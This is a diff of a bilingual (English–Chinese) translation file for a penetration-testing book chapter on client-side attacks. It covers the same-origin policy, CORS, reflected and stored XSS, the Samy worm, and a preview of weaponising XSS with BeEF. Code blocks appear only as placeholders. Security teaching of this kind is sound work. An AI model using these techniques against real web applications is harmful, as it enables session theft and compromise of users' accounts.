@@ -1,325 +1,471 @@
 - en: Chapter 9. Practical Client-Side Attacks
+  id: totrans-0
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 第9章。实用客户端攻击
 - en: When we talk about client-side attacks, there is a tendency to discredit their
     viability in compromising an environment. After all, executing JavaScript in the
     browser is far less sexy than executing native code and popping a shell on the
     application server itself. What's the point of being able to execute heavily sandboxed
     JavaScript in a short-lived browsing session? How much damage can an attacker
     do with this type of vulnerability? Quite a bit, as it turns out.
+  id: totrans-1
   prefs: []
   type: TYPE_NORMAL
+  zh: 当我们谈论客户端攻击时，有一种倾向是质疑它们在危害环境方面的可行性。毕竟，在浏览器中执行JavaScript远不如在应用服务器本身上执行本机代码和弹出shell那么吸引人。能够在短暂的浏览会话中执行高度沙箱化的JavaScript有什么意义？攻击者可以利用这种类型的漏洞造成多大的破坏？事实证明，可以造成相当大的破坏。
 - en: In this chapter, we will explore client-side attacks, with a heavy emphasis
     on XSS. We will also look at **Cross-Site Request Forgery** (**CSRF**) attacks
     and discuss the implications of the **same-origin policy** (**SOP**). Next, we
     will look at ways to weaponize XSS vulnerabilities using BeEF.
+  id: totrans-2
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本章中，我们将探讨客户端攻击，重点关注XSS。我们还将讨论**跨站请求伪造**（**CSRF**）攻击的影响，并讨论**同源策略**（**SOP**）的含义。接下来，我们将看看如何利用BeEF武器化XSS漏洞。
 - en: 'By the end of the chapter, you should be comfortable with:'
+  id: totrans-3
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本章结束时，您应该对以下内容感到满意：
 - en: Stored, reflected, and DOM-based XSS
+  id: totrans-4
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 存储、反射和基于DOM的XSS
 - en: CSRF and possible attacks and limitations
+  id: totrans-5
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: CSRF和可能的攻击和限制
 - en: BeEF, the de facto tool for client-side exploitation in the browser
+  id: totrans-6
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: BeEF，浏览器中客户端利用的事实上的工具
 - en: We will spend quite a bit of time on BeEF, as it makes XSS attacks viable. It
     allows us to easily perform social engineering attacks to execute malicious native
     code, implement a keylogger, persist our access, and even tunnel traffic through
     the victim's browser.
+  id: totrans-7
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们将花费相当多的时间在BeEF上，因为它使XSS攻击变得可行。它允许我们轻松执行社会工程攻击来执行恶意本机代码，实现键盘记录器，持久化我们的访问，并甚至通过受害者的浏览器进行流量隧道传输。
 - en: SOP
+  id: totrans-8
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: SOP
 - en: Consider a scenario where a target is logged into their Gmail account ([mail.google.com](http://mail.google.com))
     in one of the open browser tabs. In another tab, they navigate to a different
     site, on a different domain, which contains attacker code that wants access to
     that Gmail data. Maybe they were socially engineered to visit this particular
     site or maybe they were redirected there through a malicious advertising (malvertising)
     campaign on a well-known news site.
+  id: totrans-9
   prefs: []
   type: TYPE_NORMAL
+  zh: 考虑这样一个场景，一个目标用户在一个打开的浏览器标签页中登录了他们的Gmail账户（[mail.google.com](http://mail.google.com)）。在另一个标签页中，他们导航到一个不同域的不同站点，其中包含想要访问那些Gmail数据的攻击者代码。也许他们被社会工程引导访问了这个特定站点，或者可能是通过一个著名新闻站点上的恶意广告（malvertising）活动被重定向到那里。
 - en: The attacker code may try to open a connection to the [mail.google.com](http://mail.google.com)
     domain, and because the victim is already authenticated in the other browser tab,
     the code should be able to read and send emails as well by forging requests to
     Gmail. JavaScript provides all the tools necessary to accomplish all of this,
     so why isn't everything on fire?
+  id: totrans-10
   prefs: []
   type: TYPE_NORMAL
+  zh: 攻击者的代码可能会尝试连接到[mail.google.com](http://mail.google.com)域，因为受害者已经在其他浏览器标签页中进行了身份验证，所以代码应该能够通过伪造请求来读取和发送邮件。JavaScript提供了完成所有这些所需的所有工具，那为什么一切都不在火中呢？
 - en: The answer, as we will see in detail shortly, is because of the SOP. The SOP
     prevents this exact attack and, unless the attacker can inject their code directly
     into [mail.google.com](http://mail.google.com), they will not be able to read
     any of its sensitive information.
+  id: totrans-11
   prefs: []
   type: TYPE_NORMAL
+  zh: 正如我们很快将在详细中看到的，答案是因为SOP。SOP阻止了这种确切的攻击，除非攻击者能够直接将他们的代码注入到[mail.google.com](http://mail.google.com)，否则他们将无法读取任何敏感信息。
 - en: The SOP was introduced back in the Netscape days because the potential for abuse
     was very real without it. Simply put, the SOP restricts sites from accessing information
     from other sites, unless the origin of the request source is the same as the destination.
+  id: totrans-12
   prefs: []
   type: TYPE_NORMAL
+  zh: SOP是在网景时代引入的，因为没有它，滥用的潜力是非常真实的。简单来说，SOP限制了站点从其他站点访问信息，除非请求源的来源与目标相同。
 - en: There is a simple algorithm to determine whether the SOP has been breached.
     The browser will compare the schema, domain, and port of the source (origin) site
     to that of the destination (target) site and if any one item doesn't match, read
     access will be denied.
+  id: totrans-13
   prefs: []
   type: TYPE_NORMAL
+  zh: 有一个简单的算法来确定SOP是否被突破。浏览器将比较源（来源）站点的模式、域和端口与目标站点的模式、域和端口，如果有任何一项不匹配，读取访问将被拒绝。
 - en: 'In our earlier example, the target site in the attack would be the following
     URI: [https://mail.google.com/mail/u/0/#inbox](https://mail.google.com/mail/u/0/#inbox),
     which would translate to the following origin triple:'
+  id: totrans-14
   prefs: []
   type: TYPE_NORMAL
+  zh: 在我们之前的示例中，攻击的目标站点将是以下URI：[https://mail.google.com/mail/u/0/#inbox](https://mail.google.com/mail/u/0/#inbox)，这将转换为以下源三元组：
 - en: '[PRE0]'
+  id: totrans-15
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE0]'
 - en: 'Attacker code running on [https://www.cnn.com/](https://www.cnn.com/) would
     be denied read access because the domain doesn''t match:'
+  id: totrans-16
   prefs: []
   type: TYPE_NORMAL
+  zh: 在[https://www.cnn.com/](https://www.cnn.com/)上运行的攻击者代码将被拒绝读取访问，因为域名不匹配：
 - en: '[PRE1]'
+  id: totrans-17
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE1]'
 - en: 'Even malicious code running on [https://www.google.com/](https://www.google.com/)
     would fail to access Gmail because the domain does not match, even though they
     are on the same physical server:'
+  id: totrans-18
   prefs: []
   type: TYPE_NORMAL
+  zh: 即使在[https://www.google.com/](https://www.google.com/)上运行恶意代码也无法访问Gmail，因为域名不匹配，尽管它们在同一台物理服务器上：
 - en: '| Origin | Target | Result |'
+  id: totrans-19
   prefs: []
   type: TYPE_TB
+  zh: '| 源 | 目标 | 结果 |'
 - en: '| --- | --- | --- |'
+  id: totrans-20
   prefs: []
   type: TYPE_TB
+  zh: '| --- | --- | --- |'
 - en: '| [https://mail.google.com/mail/u/0/#inbox](https://mail.google.com/mail/u/0/#inbox)
     | [https://mail.google.com/mail/u/0/#inbox](https://mail.google.com/mail/u/0/#inbox)
     | Allowed, port `443` is implied |'
+  id: totrans-21
   prefs: []
   type: TYPE_TB
+  zh: '| [https://mail.google.com/mail/u/0/#inbox](https://mail.google.com/mail/u/0/#inbox)
+    | [https://mail.google.com/mail/u/0/#inbox](https://mail.google.com/mail/u/0/#inbox)
+    | 允许，端口`443`被隐含 |'
 - en: '| [http://mail.google.com/mail/u/0/#inbox](http://mail.google.com/mail/u/0/#inbox)
     | [https://mail.google.com/mail/u/0/#inbox](https://mail.google.com/mail/u/0/#inbox)
     | Denied, schema mismatch |'
+  id: totrans-22
   prefs: []
   type: TYPE_TB
+  zh: '| [http://mail.google.com/mail/u/0/#inbox](http://mail.google.com/mail/u/0/#inbox)
+    | [https://mail.google.com/mail/u/0/#inbox](https://mail.google.com/mail/u/0/#inbox)
+    | 拒绝，模式不匹配 |'
 - en: '| [https://mail.google.com:8443/u/0/#inbox](https://mail.google.com:8443/u/0/#inbox)
     | [https://mail.google.com/mail/u/0/#inbox](https://mail.google.com/mail/u/0/#inbox)
     | Denied, port mismatch |'
+  id: totrans-23
   prefs: []
   type: TYPE_TB
+  zh: '| [https://mail.google.com:8443/u/0/#inbox](https://mail.google.com:8443/u/0/#inbox)
+    | [https://mail.google.com/mail/u/0/#inbox](https://mail.google.com/mail/u/0/#inbox)
+    | 拒绝，端口不匹配 |'
 - en: '| [https://dev.mail.google.com/u/0/#inbox](https://dev.mail.google.com/u/0/#inbox)
     | [https://mail.google.com/u/0/#inbox](https://mail.google.com/u/0/#inbox) | Denied,
     domain mismatch |'
+  id: totrans-24
   prefs: []
   type: TYPE_TB
+  zh: '| [https://dev.mail.google.com/u/0/#inbox](https://dev.mail.google.com/u/0/#inbox)
+    | [https://mail.google.com/u/0/#inbox](https://mail.google.com/u/0/#inbox) | 拒绝，域名不匹配
+    |'
 - en: This makes sense from a defense perspective. The scenario we outlined earlier
     would be a nightmare if not for the SOP. However, if we look closely at web apps
     on the internet, we'll notice that almost all include content such as images,
     stylesheets, and even JavaScript code.
+  id: totrans-25
   prefs: []
   type: TYPE_NORMAL
+  zh: 从防御的角度来看这是有道理的。我们之前概述的情景如果没有SOP将是一场噩梦。然而，如果我们仔细观察互联网上的Web应用程序，我们会注意到几乎所有都包含诸如图像、样式表，甚至JavaScript代码等内容。
 - en: Sharing resources cross-origin or cross-site has its benefits for the application.
     Static content can be offloaded to CDNs, which are typically hosted on other domains
     (think Facebook's `fbcdn.net`, for example), allowing for greater flexibility,
     speed, and ultimately, cost savings while serving users.
+  id: totrans-26
   prefs: []
   type: TYPE_NORMAL
+  zh: 跨源或跨站点共享资源对应用程序有其好处。静态内容可以被卸载到CDN上，这些CDN通常托管在其他域上（例如Facebook的`fbcdn.net`），从而在为用户提供服务时提供更大的灵活性、速度和最终成本节约。
 - en: The SOP does allow access to certain types of resources cross-origin to ensure
     the web functions normally. After all, when the focus is user experience, a security
     policy that makes the application unusable is not a great security policy, no
     matter how secure it may actually be.
+  id: totrans-27
   prefs: []
   type: TYPE_NORMAL
+  zh: SOP确实允许访问某些类型的跨源资源，以确保Web正常运行。毕竟，当焦点是用户体验时，使应用程序无法使用的安全策略并不是一个很好的安全策略，无论它实际上有多安全。
 - en: 'The SOP will permit the following types of cross-origin objects to be embedded
     into the origin from any other site:'
+  id: totrans-28
   prefs: []
   type: TYPE_NORMAL
+  zh: SOP将允许以下类型的跨源对象嵌入到来自任何其他站点的源中：
 - en: Images
+  id: totrans-29
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 图像
 - en: Stylesheets
+  id: totrans-30
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 样式表
 - en: Scripts (which the browser will gladly execute!)
+  id: totrans-31
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 脚本（浏览器将乐意执行！）
 - en: Inline frames (`iframe`)
+  id: totrans-32
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 内联框架（`iframe`）
 - en: We can include images from our CDN, and the browser will download the image
     bytes and render them onto the screen. We cannot, however, read the bytes programmatically
     using JavaScript. The same goes for other static content that is allowed by the
     SOP. We can, for example, include a stylesheet with JavaScript, but we cannot
     read the actual contents of the stylesheet if the origin does not match.
+  id: totrans-33
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们可以从我们的CDN中包含图像，浏览器将下载图像字节并将其呈现到屏幕上。然而，我们无法使用JavaScript以编程方式读取字节。对于SOP允许的其他静态内容也是如此。例如，我们可以用JavaScript包含样式表，但如果源不匹配，我们无法读取样式表的实际内容。
 - en: This is true for `iframe` elements as well. We can create a new `iframe` object
     and point it to an arbitrary URL, and the browser will gladly load the content.
     We cannot, however, read the contents if we are in breach of the SOP.
+  id: totrans-34
   prefs: []
   type: TYPE_NORMAL
+  zh: 这对于`iframe`元素也是成立的。我们可以创建一个新的`iframe`对象并指向任意URL，浏览器会愉快地加载该内容。然而，如果我们违反了SOP，就无法读取其内容。
 - en: 'In the following example, we are creating an `iframe` element inside the [https://bittherapy.net](https://bittherapy.net)
     web application, emulating what an XSS attack or malicious cross-origin script
     could accomplish if allowed to execute in the context of [bittherapy.net](http://bittherapy.net):'
+  id: totrans-35
   prefs: []
   type: TYPE_NORMAL
+  zh: 在以下示例中，我们在[https://bittherapy.net](https://bittherapy.net) web应用程序内创建一个`iframe`元素，模拟如果允许执行XSS攻击或恶意跨源脚本，可能会发生的情况，这一切都在[bittherapy.net](http://bittherapy.net)上下文中执行：
 - en: '![SOP](graphics/B09238_09_01.jpg)'
+  id: totrans-36
   prefs: []
   type: TYPE_IMG
+  zh: '![SOP](graphics/B09238_09_01.jpg)'
 - en: 'Figure 9.1: Creating an iframe element using the browser console'
+  id: totrans-37
   prefs: []
   type: TYPE_NORMAL
+  zh: 图9.1：使用浏览器控制台创建`iframe`元素
 - en: First, we create a new `iframe` element using the `document.createElement()`
     function and store it in the `frame` variable. Next, we set the `iframe` URL to
     [https://bittherapy.net](https://bittherapy.net) using the `src` property on `frame`.
     Lastly, we add the newly created `iframe` object to the document using the `document.body.append()`
     function.
+  id: totrans-38
   prefs: []
   type: TYPE_NORMAL
+  zh: 首先，我们使用`document.createElement()`函数创建一个新的`iframe`元素，并将其存储在`frame`变量中。接下来，我们使用`frame`上的`src`属性将`iframe`的URL设置为[https://bittherapy.net](https://bittherapy.net)。最后，我们使用`document.body.append()`函数将新创建的`iframe`对象添加到文档中。
 - en: We can see that the frame source (`frame.src`) matches the parent origin triple
     exactly and when we try to read the contents of the `iframe` element's head using `frame.contentDocument`,
     we succeed. The SOP was not violated.
+  id: totrans-39
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们可以看到，`frame.src`的源与父域完全匹配，当我们尝试使用`frame.contentDocument`读取`iframe`元素的头部内容时，我们成功了。SOP并未被违反。
 - en: 'Conversely, creating an `iframe` to [https://bing.com/](https://bing.com/)
     within the [https://bittherapy.net](https://bittherapy.net) application will work,
     and the object will be created, but we won''t be able to access its contents,
     as we can see in the following figure:'
+  id: totrans-40
   prefs: []
   type: TYPE_NORMAL
+  zh: 相反，在[https://bittherapy.net](https://bittherapy.net)应用程序中创建指向[https://bing.com/](https://bing.com/)的`iframe`将会成功，且对象会被创建，但我们无法访问其内容，正如我们在下面的图中所看到的：
 - en: '![SOP](graphics/B09238_09_02.jpg)'
+  id: totrans-41
   prefs: []
   type: TYPE_IMG
+  zh: '![SOP](graphics/B09238_09_02.jpg)'
 - en: 'Figure 9.2: Creating a cross-origin frame and attempting to access its contents
     fails'
+  id: totrans-42
   prefs: []
   type: TYPE_NORMAL
+  zh: 图9.2：创建跨源框架并尝试访问其内容失败
 - en: The Bing search app loaded just fine, as we can see in the rendered site on
     the right, but programmatically, we cannot read the contents because that violates
     the SOP.
+  id: totrans-43
   prefs: []
   type: TYPE_NORMAL
+  zh: Bing搜索应用加载正常，正如我们在右侧渲染的页面中看到的那样，但从编程角度来看，我们无法读取其内容，因为这违反了SOP。
 - en: JavaScript is also accessible cross-origin and this is usually a good thing.
     Offloading your JavaScript libraries to a CDN can reduce load times and bandwidth
     usage. **CDNJS** is a prime example of how sites can benefit from including JavaScript
     from a third-party.
+  id: totrans-44
   prefs: []
   type: TYPE_NORMAL
+  zh: JavaScript也可以跨源访问，这通常是件好事。将JavaScript库卸载到CDN可以减少加载时间和带宽使用。**CDNJS**是一个典型的例子，展示了站点如何通过引入来自第三方的JavaScript获益。
 - en: Note
+  id: totrans-45
   prefs:
   - PREF_H3
   type: TYPE_NORMAL
+  zh: 注意
 - en: CDNJS is an open-source web CDN providing almost every conceivable JavaScript
     library. More information on this great service can be found at [https://cdnjs.com/](https://cdnjs.com/).
+  id: totrans-46
   prefs: []
   type: TYPE_NORMAL
+  zh: CDNJS是一个开源的Web CDN，提供几乎所有常见的JavaScript库。有关这个伟大服务的更多信息，可以访问[https://cdnjs.com/](https://cdnjs.com/)。
 - en: Any other type of data that we may try to load cross-origin using JavaScript
     would be denied. This includes fonts, JSON, XML, or HTML.
+  id: totrans-47
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们尝试通过JavaScript加载的任何其他跨源数据都会被拒绝。这包括字体、JSON、XML或HTML。
 - en: Cookies deserve a special mention when talking about the SOP. Cookies are typically
     tied to either the domain or a parent domain, and can be restricted to secure
     HTTP connections. Browsers can also be instructed to disallow JavaScript access
     to certain cookies, to prevent attacks such as XSS from extracting session information.
+  id: totrans-48
   prefs: []
   type: TYPE_NORMAL
+  zh: 在谈到SOP时，Cookies需要特别提到。Cookies通常与域名或父域名绑定，并且可以限制为安全的HTTP连接。浏览器还可以被指示禁止JavaScript访问某些Cookies，以防止像XSS这样的攻击从中提取会话信息。
 - en: The cookie policy is fine-tuned by the application server when the cookie is
     initially set, using the `Set-Cookie` HTTP response header. As I said earlier,
     unless otherwise specified, cookies are typically bound to the application domain
     name. Wildcard domains can also be used, which would instruct the browser to pass
     the cookies for requests to all subdomains as well.
+  id: totrans-49
   prefs: []
   type: TYPE_NORMAL
+  zh: 当 cookie 最初设置时，应用程序服务器通过 `Set-Cookie` HTTP 响应头来调整 cookie 策略。 正如我之前所说，除非另有说明，否则
+    cookie 通常绑定到应用程序域名。 也可以使用通配符域，这将指示浏览器将 cookie 传递给所有子域的请求。
 - en: Applications will leverage cookies to manage authentication and user sessions.
     A unique value will be sent to the client once they've successfully logged in,
     and the browser will pass this value back to the application for all subsequent
     requests, provided the domain and path match what was specified when the cookie
     was initially set.
+  id: totrans-50
   prefs: []
   type: TYPE_NORMAL
+  zh: 应用程序将利用 cookie 来管理身份验证和用户会话。 一旦用户成功登录，客户端将收到一个唯一值，并且浏览器将在随后的所有请求中将此值传回应用程序，前提是域名和路径与最初设置
+    cookie 时指定的相匹配。
 - en: The side effect of this behavior is that a user only has to login to the application
     once and the browser will maintain the authenticated session by passing cookies
     in the background with every request. This greatly improves user experience but
     can also be abused by attackers.
+  id: totrans-51
   prefs: []
   type: TYPE_NORMAL
+  zh: 这种行为的副作用是用户只需登录到应用程序一次，浏览器就会通过在后台的每个请求中传递 cookie 来保持经过身份验证的会话。 这极大地改善了用户体验，但也可能被攻击者滥用。
 - en: Cross-origin resource sharing
+  id: totrans-52
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 跨域资源共享
 - en: In the age of microservices, where web application components are decoupled
     and run as separate instances on totally different domains, the SOP presents some challenges.
+  id: totrans-53
   prefs: []
   type: TYPE_NORMAL
+  zh: 在微服务时代，Web 应用程序组件解耦并作为完全不同域上的独立实例运行时，SOP 提出了一些挑战。
 - en: Attempting to read some API data presented in JSON format would normally be
     denied by the SOP unless the origin triple matches. This is inconvenient, and
     applications become hard to develop and scale if we are constrained to the same
     domain, port, and scheme.
+  id: totrans-54
   prefs: []
   type: TYPE_NORMAL
+  zh: 尝试读取以 JSON 格式呈现的某些 API 数据通常会受到 SOP 的拒绝，除非源三元组匹配。 如果我们受限于相同的域、端口和方案，这将变得不便，应用程序将难以开发和扩展。
 - en: To loosen up the SOP, **cross-origin resource sharing** (**CORS**) was introduced,
     making developers happy again. CORS allows a particular site to specify which
     origins are allowed access to read content that is normally denied by the SOP.
+  id: totrans-55
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了放宽 SOP，引入了 **跨域资源共享** (**CORS**)，再次使开发人员感到高兴。 CORS 允许特定站点指定允许访问通常由 SOP 拒绝的内容的来源。
 - en: The application server HTTP response can include an `Access-Control-Allow-Origin`
     header, which the client can use to determine whether it should complete the connection
     and retrieve the data.
+  id: totrans-56
   prefs: []
   type: TYPE_NORMAL
+  zh: 应用服务器的 HTTP 响应可能包含一个 `Access-Control-Allow-Origin` 头部，客户端可以用它来确定是否完成连接并检索数据。
 - en: Note
+  id: totrans-57
   prefs:
   - PREF_H3
   type: TYPE_NORMAL
+  zh: 注意
 - en: 'CORS is well-documented on the Mozilla Developer Network: [https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)'
+  id: totrans-58
   prefs: []
   type: TYPE_NORMAL
+  zh: CORS 在 Mozilla 开发者网络有详细文档：[https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
 - en: 'We can see Spotify''s public API CORS policy using `curl`:'
+  id: totrans-59
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们可以使用 `curl` 查看 Spotify 的公共 API CORS 策略：
 - en: '[PRE2]'
+  id: totrans-60
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE2]'
 - en: 'This particular API is public and, therefore, will inform the client that all
     origins are allowed to read response contents. This is done with the value for
     `Access-Control-Allow-Origin` set to a wildcard: `*`. Private APIs will typically
     use a more specific value, such as an expected URL.'
+  id: totrans-61
   prefs: []
   type: TYPE_NORMAL
+  zh: 这个特定的 API 是公共的，因此将告知客户端允许所有来源读取响应内容。 这是通过将 `Access-Control-Allow-Origin` 的值设置为通配符
+    `*` 来实现的。 私有 API 通常会使用更具体的值，例如预期的 URL。
 - en: The Spotify server responds with other `Access-Control` headers, which specify
     which methods and headers are accepted, and whether credentials can be passed
     with each request. The CORS policy can get quite deep, but for the most part,
     we are concerned with what origin a particular target site allows.
+  id: totrans-62
   prefs: []
   type: TYPE_NORMAL
+  zh: Spotify 服务器会响应其他 `Access-Control` 头，指定接受哪些方法和头，并确定每个请求是否可以传递凭据。 CORS 策略可能会变得非常复杂，但我们大部分关注的是特定目标站点允许的来源。
 - en: XSS
+  id: totrans-63
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: XSS
 - en: 'Another prevalent type of attack that I still encounter out in the field very
     frequently is XSS. XSS comes in a few flavors, but they all provide attackers
     with the same thing: arbitrary JavaScript code execution in the client''s browser.'
+  id: totrans-64
   prefs: []
   type: TYPE_NORMAL
+  zh: 在实地工作中，我经常遇到的另一种普遍攻击类型是 XSS。 XSS 有几种变体，但它们都提供给攻击者同样的东西：在客户端浏览器中执行任意的 JavaScript
+    代码。
 - en: While this may not sound as great as executing code on the actual application
     server, XSS attacks can be devastating when used in targeted attacks.
+  id: totrans-65
   prefs: []
   type: TYPE_NORMAL
+  zh: 虽然这听起来不像在实际的应用服务器上执行代码那么“厉害”，但 XSS 攻击在定向攻击中可能会造成毁灭性的后果。
 - en: Reflected XSS
+  id: totrans-66
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 反射型 XSS
 - en: The more common type of XSS vulnerability is the reflected or non-persistent
     kind. A **reflected XSS** attack happens when the application accepts input from
     the user, either via parameters in the URL, body, or HTTP headers, and it returns
@@ -327,61 +473,90 @@
     to as non-persistent because once the user navigates away from the vulnerable
     page, or they close the browser, the exploit is over. Reflected XSS attacks typically
     require some social engineering due to the ephemeral nature of the payload.
+  id: totrans-67
   prefs: []
   type: TYPE_NORMAL
+  zh: 更常见的 XSS 漏洞类型是反射型或非持久性类型。**反射型 XSS** 攻击发生在应用程序接受来自用户的输入（无论是通过 URL 参数、正文或 HTTP
+    头），并且没有先清理它，就将其返回给用户。这种类型的攻击被称为非持久性攻击，因为一旦用户离开易受攻击的页面，或者关闭浏览器，攻击就结束了。反射型 XSS 攻击通常需要一定的社会工程学技巧，因为有效负载的持续时间很短。
 - en: Note
+  id: totrans-68
   prefs:
   - PREF_H3
   type: TYPE_NORMAL
+  zh: 注意
 - en: To showcase XSS attacks, we will once again use the badguys project from Mike
     Pirnat. The web application code can be downloaded from [https://github.com/mpirnat/lets-be-bad-guys](https://github.com/mpirnat/lets-be-bad-guys).
+  id: totrans-69
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了展示 XSS 攻击，我们将再次使用 Mike Pirnat 的 badguys 项目。Web 应用程序代码可以从 [https://github.com/mpirnat/lets-be-bad-guys](https://github.com/mpirnat/lets-be-bad-guys)
+    下载。
 - en: 'To showcase this type of vulnerability, I have loaded the application on `badguys.local`.
     The `/cross-site-scripting/form-field` URL is vulnerable to an XSS attack in the
     `qs` parameter:'
+  id: totrans-70
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了展示这种漏洞，我在 `badguys.local` 上加载了应用程序。`/cross-site-scripting/form-field` URL
+    在 `qs` 参数中易受 XSS 攻击：
 - en: '[PRE3]'
+  id: totrans-71
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE3]'
 - en: The application will take the user-inputted value and pre-fill a text field
     somewhere on the page. This is common behavior for login forms, where the user
     may enter the wrong password and the page will reload to display an error message.
     In an attempt to improve user experience, the application automatically fills
     the username field with the previously inputted value. If the username value is
     not sanitized, bad things can happen.
+  id: totrans-72
   prefs: []
   type: TYPE_NORMAL
+  zh: 应用程序会获取用户输入的值并在页面的某个地方预填充文本字段。这是登录表单的常见行为，用户可能输入错误的密码，页面会重新加载并显示错误消息。为了改善用户体验，应用程序会自动填充用户名字段，显示之前输入的值。如果用户名值没有经过清理，坏事就可能发生。
 - en: 'To confirm the vulnerability, we can feed it the Elsobky polyglot payload covered
     in previous chapters and observe the application''s behavior:'
+  id: totrans-73
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了确认漏洞，我们可以输入前面章节中介绍的 Elsobky 多语言攻击有效负载，并观察应用程序的行为：
 - en: '[PRE4]'
+  id: totrans-74
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE4]'
 - en: 'Once we drop the bomb, while the application''s server is unaffected, the page
     rendered by the browser is a different story. We can see the fallout from this
     attack by inspecting the application''s source code around the affected input
     field:'
+  id: totrans-75
   prefs: []
   type: TYPE_NORMAL
+  zh: 一旦我们投下“炸弹”，虽然应用程序的服务器不受影响，但浏览器渲染的页面却是另一回事。我们可以通过检查应用程序源代码中受影响的输入字段来查看此次攻击的后果：
 - en: '![Reflected XSS](graphics/B09238_09_03.jpg)'
+  id: totrans-76
   prefs: []
   type: TYPE_IMG
+  zh: '![反射型 XSS](graphics/B09238_09_03.jpg)'
 - en: 'Figure 9.3: The polyglot reveals an XSS vulnerability'
+  id: totrans-77
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 9.3：多语言攻击揭示了 XSS 漏洞
 - en: The alert box pops up after the polyglot inserts an `<svg>` tag with the `onload`
     property set to execute `alert()`. This is possible because the application reflected
     the payload without removing dangerous characters. The browser interpreted the
     first double-quote as part of the input field, leading to the vulnerability.
+  id: totrans-78
   prefs: []
   type: TYPE_NORMAL
+  zh: 在多语言攻击插入了带有 `onload` 属性设置为执行 `alert()` 的 `<svg>` 标签后，警报框弹出。这是可能的，因为应用程序在未清理危险字符的情况下反射了有效负载。浏览器将第一个双引号解释为输入字段的一部分，从而导致了这个漏洞。
 - en: Persistent XSS
+  id: totrans-79
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 持久性 XSS
 - en: A **persistent XSS**, also called **stored XSS**, is similar to a reflected
     attack in that the input is not sanitized and is eventually reflected back to
     a visiting user. The difference, however, is that a persistent XSS is typically
@@ -389,136 +564,194 @@
     page. Stored XSS usually does not require us to trick the user into visiting the
     vulnerable page using a specially crafted URL, and could speed things up if the
     target user does not use the application frequently.
+  id: totrans-80
   prefs: []
   type: TYPE_NORMAL
+  zh: '**持久性 XSS**，也叫做 **存储型 XSS**，与反射型攻击相似，都是因为输入没有经过清理，最终被反射回访问的用户。不过，持久性 XSS 的不同之处在于，它通常被存储在应用程序的数据库中，并呈现给访问受影响页面的任何用户。存储型
+    XSS 通常不需要我们通过精心制作的 URL 来诱使用户访问易受攻击的页面，如果目标用户不频繁使用该应用程序，这种攻击可能会更快。'
 - en: A simple example of stored XSS is the comments section of a blog post. If the
     user input (the comment) is not sanitized before being stored, any user who reads the comment
     will execute whatever payload was stored in the application.
+  id: totrans-81
   prefs: []
   type: TYPE_NORMAL
+  zh: 存储型XSS的一个简单示例是博客文章的评论部分。如果用户输入（评论）在存储之前没有经过消毒，那么任何阅读评论的用户将执行在应用程序中存储的任何负载。
 - en: Perhaps the most famous example of a stored XSS attack is the **Samy worm**
     (aka **MySpace Worm**, or **JS.Spacehero**).
+  id: totrans-82
   prefs: []
   type: TYPE_NORMAL
+  zh: 或许最著名的存储型XSS攻击例子是**Samy worm**（又称**MySpace Worm**或**JS.Spacehero**）。
 - en: 'Due to the lack of proper input sanitization, Samy was able to unleash a piece
     of JavaScript code that would force the victim, who was logged in to their own
     MySpace account, to perform a couple of actions:'
+  id: totrans-83
   prefs: []
   type: TYPE_NORMAL
+  zh: 由于缺乏适当的输入消毒，Samy能够释放一段JavaScript代码，迫使已经登录到自己MySpace帐户的受害者执行几个操作：
 - en: Update their profile to include the phrase "but most of all, Samy is my hero"
+  id: totrans-84
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 更新他们的个人资料以包含短语"但最重要的是，Samy是我的英雄"
 - en: Send a friend request to Samy Kamkar's profile
+  id: totrans-85
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 向Samy Kamkar的个人资料发送好友请求
 - en: At first glance, this seemed fairly harmless, and the few users who visited
     Samy's profile would be mildly annoyed and eventually move on. What made Samy
     Kamkar famous, however, was the fact that the victim's profile was also updated
     to include the same JavaScript payload that the victim executed while browsing
     the infected profile. This turned the XSS attack into an XSS worm.
+  id: totrans-86
   prefs: []
   type: TYPE_NORMAL
+  zh: 乍一看，这似乎相当无害，少数访问Samy个人资料的用户会感到轻微不适，最终会离开。然而，使Samy Kamkar出名的是，受害者的个人资料也被更新以包含受害者在浏览被感染个人资料时执行的同一JavaScript负载。这将XSS攻击转变为XSS蠕虫。
 - en: In a mere 20 hours, Samy's profile received over a million friend requests,
     indicating the real impact of this particular stored XSS attack.
+  id: totrans-87
   prefs: []
   type: TYPE_NORMAL
+  zh: 在短短20小时内，Samy的个人资料收到了超过一百万的好友请求，显示了这种特定存储型XSS攻击的真实影响。
 - en: Note
+  id: totrans-88
   prefs:
   - PREF_H3
   type: TYPE_NORMAL
